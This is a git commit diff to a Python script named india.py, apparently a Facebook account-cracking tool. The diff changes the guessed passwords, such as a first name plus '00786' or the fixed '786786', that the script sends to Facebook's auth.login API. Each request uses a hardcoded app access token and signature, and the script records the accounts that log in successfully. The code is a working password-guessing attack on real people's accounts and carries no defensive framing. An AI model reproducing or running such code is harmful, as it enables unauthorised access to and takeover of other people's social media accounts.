4f9308a8499cd957df2b83afc67ad1438dd75b66
lovehackerAsif <61407838+lovehackerAsif@users.noreply.github.com>
2020-03-08 00:04:26 +0500

    Update india.py

--- india.py
+++ india.py
@@ -364,7 +364,7 @@ def pilih_super():
 									cek.close()
 									cp.append(user+pass3)
 								else:
-									pass4 = b['first_name'] + '123'
+									pass4 =  '786786'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
@@ -408,7 +408,7 @@ def pilih_super():
 														else:
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
-															pass7 =  b  ['first_name'] + '007'
+															pass7 =  b  ['first_name'] + '00786'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
